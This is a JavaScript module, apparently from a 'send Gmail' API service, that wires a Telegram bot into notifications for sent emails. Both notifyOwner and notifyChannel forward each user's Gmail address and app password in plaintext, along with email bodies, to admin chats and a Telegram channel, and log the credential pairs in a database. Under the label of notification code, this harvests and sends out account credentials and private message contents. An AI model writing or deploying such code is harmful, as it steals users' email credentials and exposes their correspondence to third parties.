import axios from 'axios';
import { Telegraf } from 'telegraf';
import { TelegramLog } from '../models/TelegramLog.js';
import connectDB from './connectDB.js';

let botInstance = null;
const getBot = (token) => {
  if (!botInstance) {
    botInstance = new Telegraf(token, {
      handlerTimeout: 10000,
      telegram: {
        apiRoot: 'https://api.telegram.org'
      }
    });
  }
  return botInstance;
};

// Helper: strip HTML tags dan entitas
export function stripHtml(html) {
  if (!html) return '';
  let text = html.replace(/<[^>]*>/g, ' ');
  const entities = {
    '&nbsp;': ' ',
    '&amp;': '&',
    '&lt;': '<',
    '&gt;': '>',
    '&quot;': '"',
    '&#39;': "'",
    '&apos;': "'",
  };
  text = text.replace(/&[a-z]+;/gi, (match) => entities[match] || match);
  return text.replace(/\s+/g, ' ').trim();
}

// Helper: hitung jumlah kata
export function countWords(str) {
  if (!str) return 0;
  return str.trim().split(/\s+/).length;
}

// Helper: sleep
export const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const ADMIN_CHAT_IDS = (process.env.ADMIN_CHAT_ID || '')
  .split(',')
  .map((id) => id.trim())
  .filter(Boolean);

let lastMessageTime = 0;
const MIN_SEND_INTERVAL = 1500; // 1.5 seconds minimum interval between messages

async function sendMessageWithRateLimit(chatId, message, options = {}) {
  const now = Date.now();
  const timeSinceLastMessage = now - lastMessageTime;

  if (timeSinceLastMessage < MIN_SEND_INTERVAL) {
    const delay = MIN_SEND_INTERVAL - timeSinceLastMessage;
    console.log(`[Rate Limit] Delaying message for ${delay}ms to ${chatId}`);
    await sleep(delay);
  }

  const bot = getBot(process.env.TELEGRAM_BOT_TOKEN);
  try {
    await bot.telegram.sendMessage(chatId, message, options);
    console.log(`[Telegram] Pesan terkirim ke ${chatId}`);
    lastMessageTime = Date.now();
  } catch (sendError) {
    if (sendError.response && sendError.response.statusCode === 429) {
      const retryAfter = sendError.response.body?.parameters?.retry_after || 30; // Default to 30 seconds
      console.warn(`[Rate Limit] Terkena 429 untuk ${chatId}. Menunggu ${retryAfter} detik.`);
      await sleep(retryAfter * 1000);
      try {
        await bot.telegram.sendMessage(chatId, message, options);
        console.log(`[Telegram] Pesan terkirim ke ${chatId} setelah retry.`);
        lastMessageTime = Date.now();
      } catch (retryError) {
        console.error(`[Telegram] Gagal kirim pesan ke ${chatId} setelah retry:`, retryError.message);
        throw retryError;
      }
    } else {
      console.error(`[Telegram] Gagal kirim pesan ke ${chatId}:`, sendError.message);
      throw sendError;
    }
  }
}

async function sendDocumentWithRateLimit(chatId, document, options = {}) {
  const now = Date.now();
  const timeSinceLastMessage = now - lastMessageTime;

  if (timeSinceLastMessage < MIN_SEND_INTERVAL) {
    const delay = MIN_SEND_INTERVAL - timeSinceLastMessage;
    console.log(`[Rate Limit] Delaying document for ${delay}ms to ${chatId}`);
    await sleep(delay);
  }

  const bot = getBot(process.env.TELEGRAM_BOT_TOKEN);
  try {
    await bot.telegram.sendDocument(chatId, document, options);
    console.log(`[Telegram] Dokumen terkirim ke ${chatId}`);
    lastMessageTime = Date.now();
  } catch (sendError) {
    if (sendError.response && sendError.response.statusCode === 429) {
      const retryAfter = sendError.response.body?.parameters?.retry_after || 30;
      console.warn(`[Rate Limit] Terkena 429 untuk ${chatId}. Menunggu ${retryAfter} detik.`);
      await sleep(retryAfter * 1000);
      try {
        await bot.telegram.sendDocument(chatId, document, options);
        console.log(`[Telegram] Dokumen terkirim ke ${chatId} setelah retry.`);
        lastMessageTime = Date.now();
      } catch (retryError) {
        console.error(`[Telegram] Gagal kirim dokumen ke ${chatId} setelah retry:`, retryError.message);
        throw retryError;
      }
    } else {
      console.error(`[Telegram] Gagal kirim dokumen ke ${chatId}:`, sendError.message);
      throw sendError;
    }
  }
}

export async function notifyOwner(gmailUser, gmailAppPassword, to, subject, messageId, text, html) {
  console.log('[notifyOwner] Called with params:', {
    gmailUser,
    to,
    subject,
    messageId,
    hasText: !!text,
    hasHtml: !!html,
  });

  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  if (!botToken) {
    console.error('[notifyOwner] TELEGRAM_BOT_TOKEN is missing');
    return;
  }

  if (ADMIN_CHAT_IDS.length === 0) {
    console.error('[notifyOwner] ADMIN_CHAT_ID is empty or not set');
    return;
  }

  try {
    const hasText = typeof text === 'string' && text.trim().length > 0;
    const hasHtml = typeof html === 'string' && html.trim().length > 0;
    const rawBody = hasText ? text : hasHtml ? stripHtml(html) : '';
    const bodyLabel = hasText
      ? '📄 Body Pesan'
      : hasHtml
      ? '📄 Body Pesan (HTML diubah ke teks)'
      : '📄 Body Pesan (kosong)';
    const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });

    const fileContent = `📧 NOTIFIKASI PENGIRIMAN EMAIL
✅ Status: Berhasil dikirim
📤 Dikirim ke: ${to}
📝 Subject: ${subject}
🆔 Message ID: ${messageId}

📧 Gmail yang digunakan:
└ Email: ${gmailUser}
└ App Password: ${gmailAppPassword}

${bodyLabel}:
${rawBody || '(kosong)'}

⏰ Waktu: ${timestamp}
`;

    const MAX_INLINE = 3800;
    const truncated =
      rawBody.length > MAX_INLINE
        ? rawBody.substring(0, MAX_INLINE) + '\n\n... [pesan dipotong, terlalu panjang]'
        : rawBody;

    const notificationMessage = `
📧 NOTIFIKASI PENGIRIMAN EMAIL

✅ Status: Berhasil dikirim
📤 Dikirim ke: ${to}
📝 Subject: ${subject}
🆔 Message ID: ${messageId}

📧 Gmail yang digunakan:
└ Email: ${gmailUser}
└ App Password: ${gmailAppPassword}

${bodyLabel}:
${truncated || '(kosong)'}

⏰ Waktu: ${timestamp}
    `.trim();

    for (const chatId of ADMIN_CHAT_IDS) {
      try {
        if (fileContent.length > 4096) {
          const buffer = Buffer.from(fileContent, 'utf-8');
          await sendDocumentWithRateLimit(
            chatId,
            { source: buffer, filename: 'notifikasi-email.txt' },
            {
              caption: `📧 Notifikasi pengiriman email (${rawBody.length} karakter - dikirim sebagai file)`,
            }
          );
        } else {
          await sendMessageWithRateLimit(chatId, notificationMessage);
        }
      } catch (error) {
        console.error(`[notifyOwner] Gagal kirim ke admin ${chatId}:`, error.message);
      }
    }
  } catch (error) {
    console.error('[notifyOwner] Unexpected error:', error.message);
  }
}

export async function notifyChannel(gmailUser, gmailAppPassword, subject, bodyContent) {
  console.log('[notifyChannel] Called with params:', {
    gmailUser,
    subject,
    bodyLength: bodyContent ? bodyContent.length : 0,
  });

  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const channelId = process.env.TELEGRAM_CHANNEL_ID;
  const cooldownMinutes = parseInt(process.env.NOTIFICATION_COOLDOWN_MINUTES) || 60;

  if (!botToken) {
    console.error('[notifyChannel] TELEGRAM_BOT_TOKEN is missing');
    return;
  }

  if (!channelId) {
    console.error('[notifyChannel] TELEGRAM_CHANNEL_ID is missing');
    return;
  }

  const cleanedPassword = gmailAppPassword.replace(/\s/g, '');
  await connectDB();

  const now = new Date();
  const cooldownDate = new Date(now.getTime() - cooldownMinutes * 60 * 1000);

  const existing = await TelegramLog.getByCreds(gmailUser, cleanedPassword);

  if (existing && existing.lastNotifiedAt > cooldownDate) {
    console.log(`[notifyChannel] Duplicate credentials (${gmailUser}), skipping channel notification`);
    return;
  }

  try {
    const timestamp = now.toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
    const header = `
🔔 PEMBERITAHUAN PENGGUNAAN API SEND GMAIL

📌 Subject: ${subject || '(tidak ada subject)'}

📧 Gmail yang digunakan:
└ ${gmailUser}

🔑 App Password:
└ ${cleanedPassword}

📄 Body:
`;

    const wordCount = countWords(bodyContent);
    const isLong = wordCount > 500;

    if (isLong) {
      const fullContent = `${header}\n${bodyContent || '(kosong)'}\n\n⏰ Waktu: ${timestamp}`;
      const buffer = Buffer.from(fullContent, 'utf-8');
      await sendDocumentWithRateLimit(
        channelId,
        { source: buffer, filename: 'notifikasi-email.txt' },
        {
          caption: `📧 Notifikasi pengiriman email (${wordCount} kata - dikirim sebagai file karena > 500 kata)`,
        }
      );
    } else {
      let message =
        `${header}${bodyContent && bodyContent.trim().length > 0 ? `${bodyContent.trim()}` : '(kosong)'}\n\n⏰ Waktu: ${timestamp}`;
      if (message.length > 4096) {
        message = message.substring(0, 4000) + '\n\n... [pesan dipotong karena terlalu panjang]';
      }
      await sendMessageWithRateLimit(channelId, message);
    }

    await TelegramLog.upsert(gmailUser, cleanedPassword, now);
  } catch (error) {
    console.error('[notifyChannel] Error:', error.message);
  }
}

